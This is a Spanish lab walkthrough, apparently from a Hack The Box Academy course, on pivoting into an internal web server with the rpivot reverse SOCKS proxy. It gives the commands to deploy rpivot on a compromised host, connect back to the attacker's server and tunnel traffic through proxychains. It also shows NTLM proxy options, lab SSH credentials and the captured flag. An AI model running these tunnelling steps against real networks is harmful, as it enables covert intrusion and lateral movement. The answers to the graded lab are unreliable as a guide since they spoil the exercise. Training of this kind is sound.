
# Web Server Pivoting con Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) es una herramienta de Reverse Proxy SOCKS escrita en Python para túneles SOCKS. Rpivot vincula una máquina dentro de una red corporativa a un servidor externo y expone el puerto local del cliente en el lado del servidor. Tomaremos el escenario siguiente, donde tenemos un servidor web en nuestra red interna ( `172.16.5.135`) y queremos acceder a él utilizando el proxy rpivot.

![](https://academy.hackthebox.com/storage/modules/158/77.png)

Podemos iniciar nuestro servidor proxy rpivot SOCKS usando el siguiente comando para permitir que el cliente se conecte en el puerto 9999 y escuche en el puerto 9050 las conexiones de proxy pivot.

### **Clonar Rpivot**

```shell-session
afsh4ck@kali$ sudo git clone https://github.com/klsecservices/rpivot.git
```

### **Instalar Python2.7**

```shell-session
afsh4ck@kali$ sudo apt-get install python2.7
```

Podemos iniciar nuestro servidor proxy rpivot SOCKS para conectarnos a nuestro cliente en el servidor Ubuntu comprometido usando `server.py`.

### **Ejecutar server.py desde el host de ataque**

```shell-session
afsh4ck@kali$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Antes de ejecutar, `client.py` necesitaremos transferir rpivot al objetivo. Podemos hacer esto usando este comando SCP:

### **Transferir rpivot al objetivo**

```shell-session
afsh4ck@kali$ scp -r rpivot ubuntu@<IP-Target>:/home/ubuntu/
```

### **Ejecutar client.py desde Pivot Target**

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

### **Confirmación de que se ha establecido la conexión**

```shell-session
New connection from host 10.129.202.64, source port 35226
```

Configuraremos proxychains para que pivote sobre nuestro servidor local en `127.0.0.1:9050` en nuestro host de ataque, que fue iniciado inicialmente por el servidor Python.

Finalmente, deberíamos poder acceder al servidor web en nuestro lado del servidor, que está alojado en la red interna de `172.16.5.0/23` en `172.16.5.135:80` usando Proxychains y Firefox.

### **Navegar al servidor web de destino con Proxychains**

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

![](https://academy.hackthebox.com/storage/modules/158/rpivot_proxychain.png)

De manera similar al proxy dinámico anterior, podría haber escenarios en los que no podamos pasar directamente a un servidor externo (host de ataque) en la nube. Algunas organizaciones tienen [un proxy HTTP con autenticación NTLM](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configurado con el controlador de dominio. En tales casos, podemos proporcionar una opción de autenticación NTLM adicional para realizar la autenticación a través del proxy NTLM proporcionando un nombre de usuario y contraseña. En estos casos, podríamos usar client.py de rpivot de la siguiente manera:

**Conexión a un servidor web mediante proxy HTTP y autenticación NTLM**

```bash
python client.py --server-ip <IP-TargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

## <mark style="color:purple;">Caso Práctico</mark>

Utilizando los conceptos que se enseñan en esta sección, conéctate al servidor web en la red interna. Envíe la flag de la página de inicio como respuesta.

```
SSH a 10.129.111.140 con usuario "ubuntu" y contraseña "HTB_@cademy_stdnt!"
```

### Transferimos rpivot al host objetivo con SCP

<figure><img src="/files/oKVs9FWZih4CYQjIu5er" alt=""><figcaption></figcaption></figure>

### Ver redes internas

```
ubuntu@WEB01:~/rpivot$ ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.245.82  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:4dff  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:4dff  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:4d:ff  txqueuelen 1000  (Ethernet)
        RX packets 4088  bytes 614605 (614.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 771  bytes 77943 (77.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:fe94:819  prefixlen 64  scopeid 0x20<link>
```

Descubrimos la red interna: `172.16.5.129`

### Ejecutamos rpivot

<figure><img src="/files/8eOSddAeIekhu5emYrEp" alt=""><figcaption></figcaption></figure>

### Configurar Proxychains por el puerto 9050

<figure><img src="/files/d9Pn3O0lrcwWQbHsWOhG" alt=""><figcaption></figcaption></figure>

### Acceso web

```shell-session
afsh4ck@kali$ proxychains curl -v 172.16.5.135

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
*   Trying 172.16.5.135:80...
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.135:80  ...  OK
* Connected to 172.16.5.135 (127.0.0.1) port 80
> GET / HTTP/1.1
> Host: 172.16.5.135
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 03 Jun 2024 17:22:17 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Fri, 29 Apr 2022 17:56:24 GMT
< ETag: "2abb-5ddcec2c8f66d"
< Accept-Ranges: bytes
< Content-Length: 10939
< Vary: Accept-Encoding
< Content-Type: text/html
< 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: I_L0v3_PrOxy_Ch@ins</title>
```

Encontramos la flag: `I_L0v3_PrOxy_Ch@ins`
